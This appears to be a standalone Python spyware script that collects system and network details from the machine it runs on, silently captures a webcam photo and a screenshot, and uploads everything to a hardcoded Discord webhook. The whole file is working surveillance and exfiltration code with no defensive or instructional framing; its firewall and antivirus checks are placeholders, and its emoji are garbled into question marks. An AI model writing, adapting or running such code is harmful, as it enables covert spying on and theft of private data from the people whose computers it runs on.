
import os
import platform
import socket
import requests
import psutil
import tempfile
import pyautogui  # For taking screenshots
import cv2  # For camera access

def gather_system_info():
    info = {

        "OS": platform.system() + " " + platform.release(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "CPU": platform.processor(),
        "RAM": str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB",
        "Disk Space": str(round(psutil.disk_usage('/').total / (1024.0 ** 3))) + " GB",
        "Uptime": str(psutil.boot_time()),
        "Firewall Status": get_firewall_status(),
        "Antivirus Software": get_antivirus_status(),
        "Camera Access": check_camera_access(),
        "Network Interfaces": {} 
    }

    for interface, addrs in psutil.net_if_addrs().items():
        info["Network Interfaces"][interface] = []
        for addr in addrs:
            info["Network Interfaces"][interface].append({
                "Address": addr.address,
                "Family": str(addr.family),
                "Netmask": addr.netmask,
                "Broadcast": addr.broadcast
            })

    return info

def get_firewall_status():
    return "Enabled"  # or "Disabled"

def get_antivirus_status():
    return "Windows Defender"  # or other installed antivirus

def check_camera_access():
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                camera_photo_path = os.path.join(tempfile.gettempdir(), "camera_photo.png")
                cv2.imwrite(camera_photo_path, frame)
                cap.release()
                return camera_photo_path
            else:
                cap.release()
                return "Unable to capture image"
        else:
            return "Camera not accessible"
    except Exception as e:
        return "Error: " + str(e)

def send_to_discord(info, webhook_url, camera_photo_path):
    screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    embed_message = {

        "content": "???? **System Information Collected** ????",
        "embeds": [{
            "title": "??????? System Information",
            "description": (
                f"**OS**: {info['OS']}\n"
                f"**Hostname**: {info['Hostname']}\n"
                f"**IP Address**: {info['IP Address']}\n"
                f"**CPU**: {info['CPU']}\n"
                f"**RAM**: {info['RAM']}\n"
                f"**Disk Space**: {info['Disk Space']}\n"
                f"**Uptime**: {info['Uptime']}\n"
                f"**Firewall Status**: {info['Firewall Status']}\n"
                f"**Antivirus Software**: {info['Antivirus Software']}\n"
                f"**Camera Access**: {'Accessible' if camera_photo_path else 'Not Accessible'}\n"
                "???? **Network Interfaces**:\n"
            ),
            "color": 0x00ff00
        }]
    }

    for interface, details in info["Network Interfaces"].items():
        embed_message["embeds"][0]["description"] += f'???? **{interface}**:\n'
        for addr in details:
            embed_message["embeds"][0]["description"] += f'  - {addr["Address"]} ({addr["Family"]})\n'

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, json=embed_message, headers=headers)
    if response.status_code == 204:
        print("System info sent successfully.")

    with open(screenshot_path, 'rb') as f:
        files = {
            'file': ('screenshot.png', f)
        }
        requests.post(webhook_url, files=files)

    if isinstance(camera_photo_path, str) and os.path.exists(camera_photo_path):
        with open(camera_photo_path, 'rb') as f:
            files = {
                'file': ('camera_photo.png', f)
            }
            requests.post(webhook_url, files=files)

if __name__ == "__main__":
    system_info = gather_system_info()
    camera_photo_path = check_camera_access()
    send_to_discord(system_info, "https://discord.com/api/webhooks/1350332081049174158/Hx8ESTvaPdY85DJ-qLQv2-kVsX4aga1BpFr5EaA0nsAdm6PKIQnptN9EtDfEAPocWGTt", camera_photo_path)
